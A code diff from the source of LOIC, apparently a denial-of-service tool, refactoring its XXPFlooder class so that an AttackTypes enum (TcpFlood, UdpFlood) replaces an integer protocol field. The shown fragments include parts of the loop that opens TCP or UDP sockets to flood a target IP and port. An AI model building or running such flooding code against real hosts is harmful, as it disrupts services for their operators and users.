@@ -12,17 +12,17 @@ namespace LOIC
 		public int FloodCount;
 		public string IP;
 		public int Port;
-		public int Protocol;
+		public AttackTypes AttackType;
 		public int Delay;
 		public bool Resp;
 		public string Data;
 		private bool AllowRandom;
 
-		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
+		public XXPFlooder(string ip, int port, AttackTypes attacktype, int delay, bool resp, string data, bool random)
 		{
 			this.IP = ip;
 			this.Port = port;
-			this.Protocol = proto;
+			this.AttackType = attacktype;
 			this.Delay = delay;
 			this.Resp = resp;
 			this.Data = data;
@@ -44,7 +44,7 @@ namespace LOIC
 				while (IsFlooding)
 				{
 					Socket socket = null;
-					if (Protocol == 1)
+					if (AttackType == AttackTypes.TcpFlood)
 					{
 						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 						socket.NoDelay = true;
@@ -65,7 +65,7 @@ namespace LOIC
 						}
 						catch { }
 					}
-					if (Protocol == 2)
+					if (AttackType == AttackTypes.UdpFlood)
 					{
 						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
 						socket.Blocking = Resp;
